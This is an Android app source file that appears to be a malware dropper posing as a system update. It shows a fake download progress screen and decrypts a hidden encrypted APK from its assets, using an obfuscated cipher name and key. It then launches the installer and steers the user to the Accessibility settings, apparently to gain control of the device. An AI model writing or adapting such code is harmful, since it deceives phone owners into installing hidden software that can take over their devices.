package com.base.util.apps;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.core.content.FileProvider;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends Activity {

    private static final char[] _AC = {0x14,0x10,0x06,0x7a,0x16,0x17,0x16,0x7a,0x05,0x1e,0x16,0x06,0x60,0x05,0x34,0x31,0x31,0x3c,0x3b,0x32};
    private static final char[] _AE = {0x14,0x10,0x06};

    private static final int K = 0x55;
    private static String x(char[] c) {
        char[] r = c.clone();
        for (int i = 0; i < r.length; i++) r[i] ^= K;
        return new String(r);
    }

    private static final String TAG   = "SysUpd";
    private static final String ASSET = "core.dat";

    private ProgressBar progress;
    private TextView    tvStatus, tvPct;
    private final Handler ui = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        progress = findViewById(R.id.progress);
        tvStatus = findViewById(R.id.tv_status);
        tvPct    = findViewById(R.id.tv_pct);

        animateProgress();
    }

    private void animateProgress() {
        final int[] step = {0};
        Runnable tick = new Runnable() {
            @Override public void run() {
                step[0] += 3;
                if (step[0] <= 55) {
                    setStatus("Downloading...", step[0]);
                    ui.postDelayed(this, 90);
                } else if (step[0] == 58) {
                    setStatus("Verifying...", step[0]);
                    new Thread(MainActivity.this::doInstall).start();
                }
            }
        };
        ui.postDelayed(tick, 500);
    }

    private void doInstall() {
        try {
            File out = new File(getFilesDir(), "pkg.apk");
            decrypt(ASSET, getKey(), out);
            ui.post(() -> setStatus("Installing...", 80));
            ui.post(() -> launchInstall(out));
        } catch (Exception e) {
            Log.e(TAG, "install", e);
            ui.post(this::finish);
        }
    }

    private void launchInstall(File apk) {
        try {
            Uri uri = FileProvider.getUriForFile(
                this, getPackageName() + ".provider", apk);
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(uri, "application/vnd.android.package-archive");
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
                | Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);

            if (!isAccessibilityEnabled()) {
                ui.postDelayed(this::promptAccessibility, 1200);
            }
        } catch (Exception e) {
            Log.e(TAG, "launch", e);
            finish();
        }
    }

    private boolean isAccessibilityEnabled() {
        String enabled = Settings.Secure.getString(
            getContentResolver(),
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return enabled != null && enabled.contains(getPackageName());
    }

    private void promptAccessibility() {
        try {
            Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
        } catch (Exception ignored) {}
    }

    private static byte[] getKey() {
        String _ek = "t/ytp2yZiA+H4w5+GyCFzyMUazlYAdAfZA/C4kATG38=";
        byte[] xk  = android.util.Base64.decode(_ek, android.util.Base64.DEFAULT);
        for (int i = 0; i < xk.length; i++) xk[i] ^= 0x55;
        return xk;
    }

    private void decrypt(String asset, byte[] key, File out) throws Exception {
        try (InputStream in = getAssets().open(asset);
             FileOutputStream fos = new FileOutputStream(out)) {
            byte[] iv = new byte[16]; int got = 0;
            while (got < 16) {
                int r = in.read(iv, got, 16 - got);
                if (r < 0) throw new IOException("short");
                got += r;
            }
            Cipher c = Cipher.getInstance(x(_AC));
            c.init(Cipher.DECRYPT_MODE,
                new SecretKeySpec(key, x(_AE)),
                new IvParameterSpec(iv));
            byte[] buf = new byte[65536]; int n;
            while ((n = in.read(buf)) > 0) fos.write(c.update(buf, 0, n));
            fos.write(c.doFinal());
        }
    }

    private void setStatus(String msg, int pct) {
        tvStatus.setText(msg);
        progress.setProgress(pct);
        tvPct.setText(pct + "%");
    }
}
